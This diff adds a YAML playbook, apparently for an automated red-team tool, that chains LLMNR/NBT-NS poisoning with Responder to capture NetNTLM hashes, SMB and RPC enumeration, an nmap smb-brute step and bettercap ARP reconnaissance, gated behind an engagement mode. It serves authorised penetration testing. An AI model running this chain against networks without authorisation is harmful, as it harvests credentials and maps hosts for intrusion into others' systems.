@@ -1,0 +1,112 @@
+name: lan_attack
+description: >
+  Active LAN attack chain — LLMNR/NBT-NS poisoning to capture NetNTLM hashes,
+  SMB enumeration of hosts and users, SMB brute-force validation, and lateral
+  movement via pass-the-hash and live bettercap host/service mapping.
+  Requires redteam engagement mode.
+tags: [attack, lan, credential, lateral-movement, redteam, ntlm]
+variables:
+  network: ""      # Target CIDR (e.g. 192.168.1.0/24)
+  interface: ""    # Network interface for poisoning/capture
+  target: ""       # Specific host after discovery (IP or hostname)
+  domain: ""       # Active Directory domain name
+
+steps:
+
+  # ── Phase gate: credential harvesting ────────────────────────────────────────
+  - name: phase_poison
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: credential_harvesting
+    on_fail: continue
+
+  # ── LLMNR / NBT-NS poisoning ─────────────────────────────────────────────────
+  # Listen for 5 minutes — captures NetNTLMv2 hashes from misconfigured clients
+  - name: responder_poison
+    tool: credential_attack
+    action: responder
+    params:
+      interface: "${interface}"
+      duration: 300
+    timeout: 360
+    on_fail: continue
+
+  # ── SMB host and user enumeration ────────────────────────────────────────────
+  # Maps SMB signing, OS versions, and usernames across the subnet
+  - name: crackmapexec_enum
+    tool: credential_attack
+    action: crackmapexec_enum
+    params:
+      network: "${network}"
+      domain: "${domain}"
+    timeout: 120
+    on_fail: continue
+
+  # Full enum4linux against the primary target — shares, users, groups, policies
+  - name: smb_enum
+    tool: service_enum
+    action: enum4linux_full
+    params:
+      target: "${target}"
+    timeout: 120
+    on_fail: continue
+
+  # ── Phase gate: credential cracking ──────────────────────────────────────────
+  # Only advance once Responder has finished capturing hashes
+  - name: phase_crack
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: credential_cracking
+    condition: "responder_poison.completed"
+    on_fail: continue
+
+  # ── SMB brute-force validation ────────────────────────────────────────────────
+  # Placeholder for hash-crack output — nmap smb-brute script tests discovered
+  # credentials directly against the target
+  - name: hash_crack
+    tool: blackarch
+    action: nmap_scan
+    params:
+      target: "${target}"
+      flags: "--script smb-brute"
+    timeout: 300
+    on_fail: continue
+
+  # ── Phase gate: lateral movement ─────────────────────────────────────────────
+  - name: phase_lateral
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: lateral_movement
+    on_fail: continue
+
+  # ── Share enumeration on primary target ──────────────────────────────────────
+  - name: smb_shares
+    tool: service_enum
+    action: smb_shares
+    params:
+      target: "${target}"
+    timeout: 60
+    on_fail: continue
+
+  # ── RPC user enumeration on primary target ────────────────────────────────────
+  - name: rpc_users
+    tool: service_enum
+    action: rpc_users
+    params:
+      target: "${target}"
+    timeout: 60
+    on_fail: continue
+
+  # ── Live host/service mapping via bettercap ───────────────────────────────────
+  # Performs ARP-based recon and service probing across the full subnet
+  - name: bettercap_recon
+    tool: blackarch
+    action: bettercap_recon
+    params:
+      interface: "${interface}"
+      target: "${network}"
+    timeout: 180
+    on_fail: continue
